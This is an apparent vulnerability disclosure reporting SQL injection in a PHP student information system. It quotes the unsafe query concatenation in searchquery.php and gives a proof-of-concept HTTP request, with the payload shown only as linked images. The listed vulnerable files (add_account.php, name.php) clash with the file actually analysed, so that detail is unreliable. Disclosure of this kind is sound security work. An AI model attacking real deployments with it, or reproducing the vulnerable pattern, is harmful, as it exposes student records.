# Student Information System

## supplier 
https://code-projects.org/student-information-system-in-php-with-source-code-2/
## Vulnerability file
add_account.php name.php

## describe

**Code analysis**   

In the searchquery.php file of Student Information System, theuser s parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 7-10 in searchquery.php

```php
$s = clean($_GET['s']);
$query = "SELECT studentno, firstname, lastname, course, yrlevel, CONCAT(firstname, ' ', lastname) as fullname 
FROM students WHERE CONCAT(firstname, ' ', lastname) LIKE '".$s."%' OR lastname LIKE '".$s."%' ORDER BY date_joined DESC LIMIT 5";
```

## POC

```
GET /Stu/studentinfosystem/searchquery.php?s=1 HTTP/1.1
Host: 127.0.0.1:8083
sec-ch-ua: 
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
sec-ch-ua-platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8083/Stu/studentinfosystem/searchresults.php?searchbox=12+12&search=Search
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=pdtmrbifdaoihek22bub5ecasu
Connection: close

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/0ec745769fda9dcd7f0e88816112d823.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/fcf9c7336a2d029f99f2aa499a6ec6c7.png)